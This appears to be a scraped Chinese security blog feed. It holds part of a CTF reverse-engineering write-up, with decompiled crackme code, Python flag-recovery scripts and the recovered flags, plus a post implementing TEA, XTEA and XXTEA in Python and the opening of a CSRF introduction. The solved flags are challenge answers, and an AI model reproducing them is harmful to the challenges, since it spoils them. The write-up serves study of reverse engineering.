fctx.call_site = 16; std::string::~string((std::string *)&amp;v83); fctx.call_site = 17; std::string::~string((std::string *)&amp;v84); fctx.call_site = -1; std::string::~string((std::string *)&amp;v87); v65 = 0; &#125; else &#123; v55 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( (int)&amp;std::cout, \"[*] You rolled 3-1-3-3-7, what does that make you? ELEET! \\\\o/\"); std::ostream::operator&lt;&lt;(v55, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v56 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((int)&amp;std::cout, \"[*] Nice job, here is the flag: \"); v57 = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v56, &amp;v84); v58 = std::ostream::operator&lt;&lt;(v57, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v58, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); fctx.call_site = 3; std::string::~string((std::string *)&amp;v72); fctx.call_site = 5; std::string::~string((std::string *)&amp;v73); fctx.call_site = 7; std::string::~string((std::string *)&amp;v74); fctx.call_site = 9; std::string::~string((std::string *)&amp;v75); fctx.call_site = 11; std::string::~string((std::string *)&amp;v76); fctx.call_site = 13; std::string::~string((std::string *)&amp;v77); fctx.call_site = 15; std::string::~string((std::string *)&amp;v78); fctx.call_site = 16; std::string::~string((std::string *)&amp;v83); fctx.call_site = 17; std::string::~string((std::string *)&amp;v84); fctx.call_site = -1; std::string::~string((std::string *)&amp;v87); &#125; &#125;... 脚本： 123456789101112#!/usr/bin/env pythonkey = [0x02, 0x37, 0x0F, 0x35, 0x0F, 0x3C, 0x15, 0x07, 0x3C, 0x30, 0x2A, 0x30, 0x55, 0x12, 0x37, 0x15, 0x1E, 0x35, 0x01, 0x51]enc = [0x13, 0x21, 0x38, 0x15, 0x3D, 0x33, 0x57, 0x47, 0x2D, 0x27, 0x6A, 0x73, 0x44, 0x05, 0x26, 0x59, 0x5C, 0x79, 0x17, 0x44, 0x45, 0x77, 0x1A, 0x75, 0x49, 0x7D, 0x05, 0x4A, 0x78, 0x74, 0x6A, 0x70, 0x42, 0x02, 0x71, 0x05, 0x0F, 0x22, 0x08]k = 116flag = ''lenEnc = len(enc)lenKey = len(key)for i in range(lenKey): key[i] = key[i] ^ kfor i in range(lenEnc): flag += chr(enc[i] ^ key[i % lenKey])print flag keylead12$ file keyleadkeylead: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1d5a4a7ffa57a2335f88093530dc89c1c71ec72, stripped 发现功能和前一题一模一样，就是变成了 elf，在 IDA 里各种 patch 就能直接出 flag： 12345678910┌─[root][bead49282cbc][~/tmp]└─▪ ./keyleadhi all ----------------------Welcome to dice game!You have to roll 5 dices and get 3, 1, 3, 3, 7 in order.Press enter to roll.You rolled 5, 3, 4, 4, 5.You rolled as I said! I&apos;ll give you the flag.ASIS&#123;1fc1089e328eaf737c882ca0b10fcfe6&#125; 输出 flag 的函数也不用逆，直接照着实现就行：void func()&#123; int v0; // ST0C_4 int v1; // ST08_4 int v2; // ST0C_4 int v3; // ST0C_4 int v4; // ST08_4 int v5; // ST0C_4 int v6; // ST08_4 int n; // [rsp+8h] [rbp-8h] int v8; // [rsp+8h] [rbp-8h] int i; // [rsp+8h] [rbp-8h] int j; // [rsp+8h] [rbp-8h] int m; // [rsp+Ch] [rbp-4h] int v12; // [rsp+Ch] [rbp-4h] int v13; // [rsp+Ch] [rbp-4h] int v14; // [rsp+Ch] [rbp-4h] int v15; // [rsp+Ch] [rbp-4h] int v16; // [rsp+Ch] [rbp-4h] m = 0; n = 0; while ( m != 1 ) &#123; putchar(enc[14 * m++]); do &#123; while ( n &lt;= 1 ) putchar(enc[20 * m - 8 * n++]); v1 = n + 1; v2 = 3 * m; putchar(enc[2 * v2 + 11 + v1]); v2 *= 5; v8 = v1 - 1; putchar(enc[2 * v2 + v8]); v12 = v2 / 3; while ( 1 ) &#123; while ( 1 ) &#123;LABEL_12: if ( !v8 ) &#123; putchar(enc[2 * v12]); v15 = v12 ^ 2; while ( 2 ) &#123; for ( i = 1; i &lt;= 9; ++i ) putchar(enc[10 * (i % 2) + 3 + v15]); v13 = v15 + 1;LABEL_44: putchar(enc[v13 / 3]); if ( i == 10 ) &#123; v13 += 2 * v13 + 13; i = 19; goto LABEL_33; &#125; if ( i == 2 ) &#123; i = v13-- + 2; goto LABEL_4; &#125; if ( (unsigned int)(i - 22) &lt;= 0xA ) &#123; v14 = v13 - 3; for ( j = i - v14; ; j = 8 ) &#123;LABEL_58: putchar(enc[v14 + 1]); v16 = v14 + 1; if ( j == 11 ) &#123; v13 = (v16 + 14) / 2; i = 11 * (v13 / 6); goto LABEL_44; &#125; if ( j != 13 ) break; v12 = v16 + 8; v8 = 2;LABEL_51: while ( 2 ) &#123; putchar(enc[v12 - 10]); if ( v8 == v12 ) &#123; v4 = v8 + 2; v5 = v12 + 2; putchar(enc[v5 / 2 + v4 / 5]); i = v4 / 2; putchar(enc[i / 5 + v5]); v13 = v5 + i - 1 + v5; while ( 1 ) &#123;LABEL_33: putchar(enc[v13 - 19]); if ( i == 2 ) &#123; v3 = v13 + 1; putchar(enc[v3 / 2 - 3]); v13 = v3 / 5 + 2; i = 2; goto LABEL_44; &#125; if ( i &lt;= 2 ) break; if ( i == 10 ) &#123; v12 = v13 - 31; v8 = 9; goto LABEL_51; &#125; if ( i != 19 ) goto LABEL_44; i = 2; &#125; if ( i == 1 ) &#123; v8 = 17; v12 = v13 % 5 - 17 + v13;LABEL_20: putchar(enc[v12 - v8 + 9]); v12 += ~v8++; continue; &#125; goto LABEL_44; &#125; break; &#125; if ( v8 != 9 ) &#123; if ( v8 != 2 ) goto LABEL_12; j = 2; v16 = v12 - 18;LABEL_64: v6 = 9 * j; putchar(enc[v16 / 2 + v6 + v6 % 10]); m = v16 + 1; n = v6 % 10; goto LABEL_21; &#125; putchar(enc[v12 - 16]); v14 = v12 / 2; &#125; if ( j == 8 ) &#123; v15 = v16 + 1; i = 7; continue; &#125; goto LABEL_64; &#125; goto LABEL_4; &#125; &#125; if ( v8 == 2 ) break; if ( v12 == 7 ) &#123; putchar(enc[21 - v8]); v13 = 49; i = v8 / 3; goto LABEL_33; &#125; if ( v8 != 3 ) goto LABEL_20; putchar(enc[2 * (v12 / 3)]); v13 = v12 / 3; i = 9; do &#123; while ( 1 ) &#123; if ( v13 == 10 ) &#123; putchar(enc[i + 8]); v14 = 9; j = i + 1; goto LABEL_58; &#125; if ( v13 == 11 ) &#123; putchar(enc[i / 7]); v13 = i-- - 11; &#125;LABEL_4: if ( i != 9 ) break; putchar(enc[v13 * v13 + 7]); v13 = v13 * v13 + 1; i = 10; &#125; &#125; while ( i != 13 ); putchar(enc[2 * v13 + 12]); v8 = 3; v12 = 3 * v13; &#125; putchar(enc[3 * v12 + 1]); v0 = v12 * v12; putchar(enc[v0 - 15]); m = v0 - 15; n = 4; putchar(enc[4]);LABEL_21: if ( n != 4 ) break; putchar(enc[m + 6]); v12 = m - 3; v8 = 3; &#125; &#125; while ( n != 8 ); putchar(enc[2 * m + 32]); &#125;&#125; Reverse0212$ file Reverse02.exeReverse02.exe: PE32 executable (GUI) Intel 80386, for MS Windows 定位到MessageBoxA，把这部分逆一下就完事了： 12345678910111213141516171819202122int func()&#123; char *v0; // eax char Dst; // [esp+0h] [ebp-38h] char v3; // [esp+1h] [ebp-37h] char v4; // [esp+Fh] [ebp-29h] Dst = 0; memset(&amp;v3, 0, 0x30u); strncpy_s(&amp;Dst, 0x31u, \"flag:&#123;NSCTF_md57e0cad17016b0&gt;?45?f7c&gt;0&gt;4a&gt;1c3a0&#125;\", 0x30u); v0 = &amp;v4; if ( v4 != '&#125;' ) &#123; do &#123; *v0 ^= 7u; ++v0; &#125; while ( *v0 != '&#125;' ); &#125; return MessageBoxA(0, &amp;Dst, \"Flag\", 0);&#125; 脚本： 123456#!/usr/bin/env pythonenc = '7e0cad17016b0&gt;?45?f7c&gt;0&gt;4a&gt;1c3a0'flag = ''for i in range(len(enc)): flag += chr(ord(enc[i]) ^ 7)print flag Reverse 10012$ file Reverse\\ 100.exeReverse 100.exe: PE32 executable (console) Intel 80386, for MS Windows main 函数看到有一个密码： 1234567891011121314151617181920212223242526272829int __cdecl main(int argc, const char **argv, const char **envp)&#123; signed int i; // edi char password; // [esp+10h] [ebp-104h] char Dst; // [esp+11h] [ebp-103h] password = 0; memset(&amp;Dst, 0, 0xFFu); printf(\"please input ns-ctf password: \"); scanf_s(\"%s\", &amp;password); for ( i = 1; strncmp(\"nsF0cuS!x01\", &amp;password, 0xBu); ++i ) &#123; printf(\"try again!\\n\"); memset(&amp;password, 0, 0x100u); printf(\"please input ns-ctf password: \"); scanf_s(\"%s\", &amp;password); &#125; dword_403368 = 1; if ( &amp;password + strlen(&amp;password) + 1 != &amp;Dst ) &#123; if ( i &gt; 3 ) &#123; func(); return 0; &#125; printf(\"flag:&#123;NSCTF_md5065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340&#125;\"); &#125; return 0;&#125; 发现和前一题一模一样： 12345678910111213141516171819202122int func()&#123; char *v0; // eax char Format; // [esp+0h] [ebp-38h] char Dst; // [esp+1h] [ebp-37h] char v4; // [esp+Fh] [ebp-29h] Format = 0; memset(&amp;Dst, 0, 0x30u); strncpy_s(&amp;Format, 0x31u, \"flag:&#123;NSCTF_md5065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340&#125;\", 0x30u); v0 = &amp;v4; if ( v4 != 125 ) &#123; do &#123; *v0 ^= 7u; ++v0; &#125; while ( *v0 != 125 ); &#125; return printf(&amp;Format);&#125; 异或一下： 123456#!/usr/bin/env pythonenc = '065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340'flag = ''for i in range(len(enc)): flag += chr(ord(enc[i]) ^ 7)print flag 第五题12$ file 5.exe5.exe: PE32 executable (console) Intel 80386, for MS Windows 用 OD 搜索字符串，定位关键函数： 在 IDA 里找到函数： 123456789void __cdecl sub_401000()&#123; int i; // [esp+0h] [ebp-18h] char v1[20]; // [esp+4h] [ebp-14h] for ( i = 0; i &lt; 19; ++i ) v1[i] = off_409030[47 * i % 100]; sub_401129((int)&amp;unk_4092CC, i);&#125; 正向实现一下就行了： 123456#!/usr/bin/env pythontable = [0x28, 0x2A, 0x26, 0x54, 0x49, 0x4F, 0x75, 0x68, 0x33, 0x6C, 0x31, 0x6A, 0x34, 0x68, 0x73, 0x64, 0x38, 0x37, 0x76, 0x67, 0x68, 0x28, 0x26, 0x25, 0x59, 0x47, 0x6B, 0x6A, 0x62, 0x76, 0x62, 0x61, 0x6C, 0x64, 0x6B, 0x66, 0x68, 0x5E, 0x26, 0x25, 0x2A, 0x26, 0x5E, 0x52, 0x31, 0x32, 0x6A, 0x33, 0x62, 0x65, 0x61, 0x73, 0x6F, 0x69, 0x64, 0x68, 0x63, 0x66, 0x39, 0x48, 0x43, 0x4C, 0x4B, 0x48, 0x56, 0x28, 0x2A, 0x47, 0x48, 0x44, 0x66, 0x68, 0x62, 0x6F, 0x71, 0x69, 0x77, 0x75, 0x65, 0x66, 0x38, 0x39, 0x32, 0x71, 0x33, 0x37, 0x78, 0x63, 0x76, 0x3B, 0x6C, 0x6B, 0x6A, 0x68, 0x71, 0x61, 0x73, 0x64, 0x6C, 0x6B, 0x66, 0x6A, 0x3B, 0x6C, 0x6B, 0x63, 0x6A, 0x76, 0x3B, 0x6C, 0x4C, 0x4B, 0x48, 0x61, 0x73, 0x64, 0x66, 0x6B, 0x6C, 0x6E, 0x4C, 0x4B, 0x6A, 0x68, 0x3B, 0x6C, 0x61, 0x73, 0x6B, 0x64, 0x66, 0x68, 0x6E, 0x49, 0x4F, 0x2A, 0x26, 0x59, 0x4F, 0x49, 0x55, 0x48, 0x4E, 0x6C, 0x6B, 0x69, 0x64, 0x66, 0x68, 0x76, 0x38, 0x30, 0x37, 0x39, 0x68, 0x6C, 0x6B, 0x6A, 0x42, 0x4F, 0x49, 0x55, 0x54, 0x36, 0x74, 0x66, 0x32, 0x33, 0x70, 0x30, 0x34, 0x2D, 0x30, 0x39, 0x75, 0x6A, 0x6C, 0x76, 0x3B, 0x6B, 0x6E, 0x30, 0x39, 0x38, 0x59, 0x49, 0x55, 0x68, 0x72, 0x6C, 0x6B, 0x34, 0x72, 0x6E, 0x5B, 0x70, 0x39, 0x75, 0x64, 0x76, 0x6C, 0x6B, 0x6D, 0x31, 0x70, 0x39, 0x79, 0x68, 0x38, 0x55, 0x47, 0x6B, 0x6A, 0x68, 0x70, 0x49, 0x48, 0x52, 0x50, 0x4F, 0x4E, 0x2A, 0x26, 0x5E, 0x52, 0x46, 0x43, 0x4C, 0x4B, 0x4A, 0x4E, 0x50, 0x4F, 0x49, 0x55, 0x45, 0x57, 0x44, 0x49, 0x55, 0x48, 0x33, 0x6F, 0x34, 0x69, 0x66, 0x67, 0x6F, 0x69, 0x76, 0x63, 0x33, 0x6F, 0x39, 0x38, 0x37, 0x34, 0x39, 0x26, 0x2A, 0x66, 0x6F, 0x69, 0x6A, 0x7A, 0x78, 0x62, 0x63, 0x76, 0x2A, 0x26, 0x2A, 0x26, 0x74, 0x33, 0x32, 0x31, 0x34, 0x61, 0x73, 0x64, 0x76, 0x7A, 0x78, 0x63, 0x43, 0x4C, 0x49, 0x4B, 0x4B, 0x48, 0x39, 0x38, 0x64, 0x75, 0x79, 0x66, 0x69, 0x32, 0x77, 0x6A, 0x6E, 0x65, 0x70, 0x66, 0x6F, 0x69, 0x63, 0x70, 0x69, 0x6B, 0x76, 0x70, 0x6F, 0x69, 0x73, 0x75, 0x64, 0x66, 0x2D, 0x39, 0x30, 0x38, 0x75, 0x33, 0x34, 0x72, 0x73, 0x64, 0x3B, 0x6C, 0x64, 0x66, 0x6B, 0x6E, 0x76, 0x3B, 0x6C, 0x64, 0x6B, 0x73, 0x66, 0x68, 0x76, 0x30, 0x39, 0x38, 0x79, 0x39, 0x75, 0x69, 0x68, 0x6E, 0x30, 0x34, 0x38, 0x79, 0x66, 0x70, 0x4F, 0x49, 0x55, 0x48, 0x29, 0x28, 0x38, 0x66, 0x68, 0x34, 0x32, 0x33, 0x6B, 0x6A, 0x35, 0x74, 0x68, 0x6E, 0x67, 0x6F, 0x78, 0x66, 0x63, 0x68, 0x76, 0x6A, 0x6B, 0x6E, 0x68, 0x30, 0x28, 0x2A, 0x59, 0x6F, 0x70, 0x69, 0x65, 0x72, 0x6E, 0x74, 0x30, 0x39, 0x75, 0x38, 0x32, 0x68, 0x67, 0x6B, 0x6A, 0x64, 0x66, 0x6E, 0x63, 0x76, 0x30, 0x39, 0x38, 0x59, 0x70, 0x66, 0x6F, 0x69, 0x6E, 0x32, 0x33, 0x34, 0x70, 0x66, 0x75, 0x69, 0x68, 0x39, 0x65, 0x77, 0x75, 0x69, 0x68, 0x6E, 0x72, 0x66, 0x67, 0x4B, 0x4C, 0x4A, 0x53, 0x41, 0x4F, 0x49, 0x70, 0x65, 0x75, 0x79, 0x68, 0x34, 0x75, 0x6E, 0x66, 0x67, 0x3B, 0x66, 0x6B, 0x76, 0x62, 0x30, 0x39, 0x38, 0x34, 0x33, 0x68, 0x6B, 0x6A, 0x76, 0x6E, 0x70, 0x49, 0x2A, 0x59, 0x4F, 0x49, 0x45, 0x6E, 0x72, 0x70, 0x32, 0x6F, 0x33, 0x69, 0x6A, 0x66, 0x39, 0x69, 0x6A, 0x78, 0x64, 0x63, 0x70, 0x4C, 0x49, 0x48, 0x4A, 0x2D, 0x39, 0x38, 0x66, 0x79, 0x32, 0x33, 0x6B, 0x6E, 0x66, 0x70, 0x6F, 0x73, 0x64, 0x69, 0x75, 0x76, 0x2D, 0x33, 0x39, 0x6A, 0x65, 0x66, 0x6F, 0x69, 0x6B, 0x31, 0x68, 0x72, 0x66, 0x38, 0x39, 0x75, 0x6A, 0x66, 0x64, 0x76, 0x6D, 0x6B, 0x70, 0x49, 0x75, 0x64, 0x31, 0x69, 0x6A, 0x65, 0x2D, 0x66, 0x39, 0x32, 0x4C, 0x4F, 0x49, 0x58, 0x4A, 0x48, 0x43, 0x28, 0x49, 0x6E, 0x65, 0x6D, 0x70, 0x77, 0x71, 0x6B, 0x66, 0x6E, 0x70, 0x39, 0x32, 0x33, 0x34, 0x75, 0x66, 0x2D, 0x30, 0x65, 0x69, 0x6B, 0x66, 0x31, 0x70, 0x33, 0x69, 0x6F, 0x34, 0x66, 0x6A, 0x2D, 0x39, 0x66, 0x6F, 0x76, 0x3B, 0x6C, 0x6B, 0x77, 0x71, 0x6E, 0x66, 0x64, 0x70, 0x76, 0x69, 0x4A, 0x4F, 0x53, 0x44, 0x6A, 0x66, 0x70, 0x32, 0x6F, 0x69, 0x33, 0x72, 0x6A, 0x66, 0x2D, 0x30, 0x39, 0x64, 0x66, 0x6A, 0x76, 0x3B, 0x6C, 0x6B, 0x31, 0x33, 0x6D, 0x66, 0x69, 0x6A, 0x2D, 0x31, 0x33, 0x30, 0x39, 0x34, 0x66, 0x75, 0x71, 0x77, 0x6B, 0x6C, 0x31, 0x70, 0x5B, 0x33, 0x34, 0x30, 0x39, 0x72, 0x6F, 0x63, 0x66, 0x6D, 0x76, 0x00]v3 = ''for i in range(19): v3 += chr(table[47 * i % 100])print v3 第六题12$ file 6.exe6.exe: PE32 executable (console) Intel 80386, for MS Windows 在 IDA 里硬逆就完事了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax signed int v4; // esi signed int v5; // eax signed int v6; // ebx signed int v7; // edi signed int v8; // esi int v9; // edx int *v10; // eax char v11; // cl int *v12; // eax char v13; // cl char *v14; // eax char v15; // cl signed int v16; // esi int *v17; // edi signed int i; // esi int v20; // [esp+Ch] [ebp-ACh] signed int v21; // [esp+10h] [ebp-A8h] int *v22; // [esp+14h] [ebp-A4h] signed int v23; // [esp+18h] [ebp-A0h] int v24; // [esp+1Ch] [ebp-9Ch] int v25; // [esp+20h] [ebp-98h] int v26; // [esp+24h] [ebp-94h] int v27; // [esp+28h] [ebp-90h] int v28; // [esp+2Ch] [ebp-8Ch] int v29; // [esp+30h] [ebp-88h] int v30; // [esp+34h] [ebp-84h] int v31; // [esp+38h] [ebp-80h] int v32; // [esp+3Ch] [ebp-7Ch] int v33; // [esp+40h] [ebp-78h] int v34; // [esp+44h] [ebp-74h] int v35; // [esp+48h] [ebp-70h] int v36; // [esp+4Ch] [ebp-6Ch] int v37[3]; // [esp+50h] [ebp-68h] char v38; // [esp+5Ch] [ebp-5Ch] int v39; // [esp+68h] [ebp-50h] int v40; // [esp+6Ch] [ebp-4Ch] int v41; // [esp+70h] [ebp-48h] __int16 v42; // [esp+74h] [ebp-44h] int v43; // [esp+78h] [ebp-40h] __int16 v44; // [esp+7Ch] [ebp-3Ch] int v45; // [esp+7Eh] [ebp-3Ah] int v46; // [esp+82h] [ebp-36h] int v47; // [esp+86h] [ebp-32h] __int16 v48; // [esp+8Ah] [ebp-2Eh] int v49; // [esp+8Ch] [ebp-2Ch] char v50; // [esp+90h] [ebp-28h] int v51; // [esp+91h] [ebp-27h] int v52; // [esp+95h] [ebp-23h] int v53; // [esp+99h] [ebp-1Fh] __int16 v54; // [esp+9Dh] [ebp-1Bh] char v55; // [esp+9Fh] [ebp-19h] int v56; // [esp+A0h] [ebp-18h] __int16 v57; // [esp+A4h] [ebp-14h] int v58; // [esp+A6h] [ebp-12h] int v59; // [esp+AAh] [ebp-Eh] int v60; // [esp+AEh] [ebp-Ah] __int16 v61; // [esp+B2h] [ebp-6h] v44 = 0; v50 = 0; v49 = 6451010; v57 = 0; v56 = 1819435331; v40 = 1231382892; v43 = 2036624961; v39 = 1866884462; v45 = 0; v46 = 0; v47 = 0; v48 = 0; v51 = 0; v52 = 0; v53 = 0; v54 = 0; v55 = 0; v58 = 0; v59 = 0; v60 = 0; v61 = 0; v24 = 2; v25 = 5; v26 = 9; v27 = 6; v28 = 7; v29 = 0; v30 = 10; v31 = 8; v32 = 12; v33 = 11; v34 = 3; v35 = 4; v36 = 1; v41 = 1213493864; v42 = 101; v23 = 0; do &#123; v3 = _time64(0); srand(v23 + v3); v4 = 0; do *(&amp;v36 + ++v4) = rand() % 100; while ( v4 &lt; 3 ); v5 = 3; v21 = 3; do &#123; v6 = 1; if ( v5 &gt; 1 ) &#123; v22 = &amp;v49; v7 = 28; v8 = -12; do &#123; v9 = *(&amp;v36 + v6); v20 = v37[v6]; if ( v20 &gt; v9 ) &#123; v10 = v22; do &#123; v11 = *(_BYTE *)v10; LOBYTE(v10[v8]) = *(_BYTE *)v10; v10 = (int *)((char *)v10 + 1); &#125; while ( v11 ); v37[v6] = v9; v12 = v22 - 5; do &#123; v13 = *(_BYTE *)v12; *((_BYTE *)v12 + 20) = *(_BYTE *)v12; v12 = (int *)((char *)v12 + 1); &#125; while ( v13 ); *(&amp;v36 + v6) = v20; v14 = &amp;v38; do &#123; v15 = *v14; v14[v7] = *v14; ++v14; &#125; while ( v15 ); v5 = v21; &#125; v22 += 5; ++v6; v8 -= 5; v7 += 20; &#125; while ( v6 &lt; v5 ); &#125; v21 = --v5; &#125; while ( v5 &gt; 0 ); v16 = 0; v17 = &amp;v43; do &#123; printf(\"%s\\t%d\\n\", v17, v37[v16++]); v17 += 5; &#125; while ( v16 &lt; 3 ); if ( strcmp((const char *)&amp;v43, \"Andy\") ) break; ++v23; &#125; while ( v23 &lt; 13 ); if ( !strcmp((const char *)&amp;v43, \"Andy\") ) &#123; for ( i = 0; i &lt; v23; ++i ) printf(\"%c\", *((char *)&amp;v39 + *(&amp;v24 + i))); &#125; system(\"pause\"); return 0;&#125; 脚本： 1234567#!/usr/bin/env pythonk = [2, 5, 9, 6, 7, 0, 0xA, 8, 0xC, 0xB, 3, 4, 1]t = 'oFen'[::-1] + 'Ieil'[::-1] + 'HTrh'[::-1] + 'e'flag = ''for i in range(13): flag += t[k[i]]print flag 第七题12$ file 7.exe7.exe: PE32 executable (console) Intel 80386, for MS Windows 简单地异或一下： 1234567891011_BYTE *__cdecl sub_401000(char *a1)&#123; _BYTE *v2; // [esp+0h] [ebp-8h] signed int i; // [esp+4h] [ebp-4h] v2 = malloc(0xAu); for ( i = 0; i &lt; 9; ++i ) v2[i] = a1[i] + 2; v2[9] = 0; return v2;&#125; 脚本： 123456#!/usr/bin/env pythonenc = 'asdfghjklq'flag = ''for i in range(9): flag += chr(ord(enc[i]) + 2)print flag","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"Python实现TEA、XTEA、XXTEA加密解密算法","slug":"Python实现TEA、XTEA、XXTEA加密解密算法","date":"2019-08-22T09:00:10.000Z","updated":"2019-12-14T09:30:14.152Z","comments":true,"path":"2019/08/22/Python实现TEA、XTEA、XXTEA加密解密算法/","link":"","permalink":"qianfei11.coding.me/2019/08/22/Python实现TEA、XTEA、XXTEA加密解密算法/","excerpt":"闲来无事，喝杯茶冷静一下。","text":"闲来无事，喝杯茶冷静一下。 TEA微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。TEA操作处理在两个32位无符号整型上（可能源于一个64位数据），并且使用一个128位的密钥。设计者是Roger Needham和David Wheeler。 加密过程： Python 实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/env pythondef encrypt(v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): x += delta x = x &amp; 0xFFFFFFFF v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(v, k): v0 = v[0] v1 = v[1] x = 0xC6EF3720 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == '__main__': plain = [1, 2] key = [2, 2, 3, 4] encrypted = encrypt(plain, key) print encrypted decrypted = decrypt(encrypted, key) print decrypted XTEAXTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等。 加密过程： Python 实现： 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env pythondef encrypt(rounds, v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 for i in range(rounds): v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF x += delta x = x &amp; 0xFFFFFFFF v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == '__main__': plain = [1, 2] key = [2, 2, 3, 4] rounds = 32 encrypted = encrypt(rounds, plain, key) print encrypted decrypted = decrypt(rounds, encrypted, key) print decrypted XXTEAXXTEA，又称Corrected Block TEA，是XTEA的升级版。 加密过程： Python 实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/env pythondef shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def encrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 / n x = 0 z = v[n - 1] for i in range(rounds): x = (x + delta) &amp; 0xFFFFFFFF e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1): y = v[p + 1] v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[p] p += 1 y = v[0] v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[n - 1] return vdef decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 / n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == '__main__': plain = [1, 2] key = [2, 2, 3, 4] encrypted = encrypt(plain, key) print encrypted decrypted = decrypt(encrypted, key) print decrypted Referenceshttps://blog.csdn.net/gsls200808/article/details/48243019","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"qianfei11.coding.me/tags/crypto/"},{"name":"python","slug":"python","permalink":"qianfei11.coding.me/tags/python/"}]},{"title":"从零开始认识跨站请求伪造（Cross-site Request Forgery）","slug":"从零开始认识跨站请求伪造（Cross-site-Request-Forgery）","date":"2019-08-20T05:51:34.000Z","updated":"2019-08-26T05:46:11.368Z","comments":true,"path":"2019/08/20/从零开始认识跨站请求伪造（Cross-site-Request-Forgery）/","link":"","permalink":"qianfei11.coding.me/2019/08/20/从零开始认识跨站请求伪造（Cross-site-Request-Forgery）/","excerpt":"常常听到 CSRF，但不怎么了解它具体的机制，简单记录一下。","text":"常常听到 CSRF，但不怎么了解它具体的机制，简单记录一下。 What is CSRFCSRF（跨站请求伪造，Cross-site Request Forgery）也被称为One-click Attack或者Session Riding。简单的来说，就是攻击者利用受害者的身份，以受害者的名义发送恶意请求。 CSRF 这种攻击方式在 2000 年被国外的安全人员提出，但在国内，直到 2006 年才开始被关注。2008 年，国内外的多个大型社区和交互网站分别爆出 CSRF 漏洞，如：纽约时报，Metafilter，YouTube，百度等等。而现在，互联网的许多站点仍对此毫无防备，以至于安全业界称 CSRF 为“沉睡的巨人”。 首先比较一下 XSS 和 CSRF： 12345678# 